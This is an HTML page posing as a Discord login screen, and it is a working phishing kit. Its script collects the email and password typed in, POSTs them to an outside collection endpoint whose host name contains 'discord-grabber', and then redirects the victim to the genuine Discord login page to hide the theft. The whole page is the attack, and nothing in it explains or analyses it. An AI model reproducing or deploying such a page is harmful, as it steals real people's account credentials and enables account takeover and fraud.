<!DOCTYPE html>
<html>
<head>
    <title>Discord Login</title>
    <style>
        body{background:#2c2f33;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
        .login-box{background:#36393f;padding:40px;border-radius:8px;width:400px;box-shadow:0 0 20px rgba(0,0,0,0.5)}
        .login-box h1{color:white;text-align:center;font-size:24px}
        .login-box input{width:100%;padding:12px;margin:10px 0;border-radius:4px;border:none;background:#202225;color:white;font-size:14px}
        .login-box button{width:100%;padding:12px;background:#5865f2;border:none;border-radius:4px;color:white;font-weight:bold;font-size:16px;cursor:pointer}
        .login-box button:hover{background:#4752c4}
        .login-box p{color:#b9bbbe;text-align:center;font-size:12px;margin-top:20px}
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Welcome Back</h1>
        <input type="text" id="email" placeholder="Email or Phone Number">
        <input type="password" id="password" placeholder="Password">
        <button onclick="sendData()">Log In</button>
        <p>By continuing, you agree to Discord's Terms of Service.</p>
    </div>
    <script>
        function sendData() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            if (!email || !password) {
                alert('Please fill in all fields.');
                return;
            }
            fetch('https://discord-grabber-production-f7fd.up.railway.app/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({email: email, password: password})
            }).then(() => {
                window.location.href = 'https://discord.com/login';
            }).catch(() => {
                window.location.href = 'https://discord.com/login';
            });
        }
    </script>
</body>
</html>
